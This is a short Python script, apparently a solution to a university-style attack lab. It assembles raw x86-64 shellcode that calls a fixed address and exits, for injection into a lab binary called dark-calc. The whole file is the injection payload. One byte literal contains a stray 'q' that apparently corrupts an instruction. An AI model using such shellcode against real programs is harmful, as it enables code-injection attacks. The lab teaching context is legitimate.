#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

adr = 0x0000721000800fd0
payload = b"\x6a\x04"
payload += b"\x5f"
payload += b"\x48\xb8\x87\x1a\x40\x00\x00\x00\x00\x00"
payload += b'\x48\x81\xec\x00\x01\x00\x00'
payload += b"\xff\xd0"
payload += b"\xeb\x08"
payload += adr.to_bytes(8,"little")
payload += b"\xb8\x3cq\x00\x00\x00"
payload += b"\x31\xff"
payload += b"\x0f\x05"


sys.stdout.buffer.write(payload)
